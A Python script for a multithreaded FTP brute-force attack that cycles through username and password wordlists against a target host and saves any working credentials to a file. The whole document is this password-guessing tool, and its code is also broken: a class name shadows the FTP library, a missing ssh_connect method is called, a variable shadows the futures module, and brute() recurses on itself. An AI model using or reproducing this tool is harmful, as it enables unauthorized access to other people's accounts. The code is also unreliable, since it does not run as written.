from ftplib import FTP,error_perm
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures

class FTP:
    def __init__(self,threads:int, hostname:str) -> None:
        self.threads=threads
        self.hostname=hostname
        self.PASSWORDS = self.fetch_files('./temp_files/passwords.txt')
        self.USERS = self.fetch_files('./temp_files/users.txt')
    def fetch_files(self,file_path):
        return [item.replace("\n", "") for item in open(file_path).readlines()]
    def login(self,username:str,password:str):
        ftp = FTP(self.hostname)
        try:
            ftp.login(user=username, passwd = password)
            print('Connection successful.')
            result = "\n[+] --------------------------------------------------------------"
            result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + username + " and " \
                                                                                                    "password: " \
                                                                                                    "" + password
            result += "\n[+] --------------------------------------------------------------\n"
            with open("./temp_files/results.txt", "w+") as frr:
                frr.write(result)
            print(
                "[+] A Match succeed 'user: " + username + " and password: " + password + "' and have been saved at "
                                                                                    "./results.txt")
            exit()
        except error_perm as error:
            print(error)
        except Exception as ex:
            print("An error occured!")
    def process_passwords(self,username:str):
        with ThreadPoolExecutor(5) as executor:
            futures = []
            for password in self.PASSWORDS:
                future = executor.submit(
                    self.ssh_connect,
                    username,
                    password
                )
                futures.append(future)

            # Wait for all futures to complete
            futures.wait(futures)
    def process_usernames(self):
        with ThreadPoolExecutor(self.threads) as executor:
            executor.map(self.process_passwords,self.USERS)
    def brute(self):
        self.brute()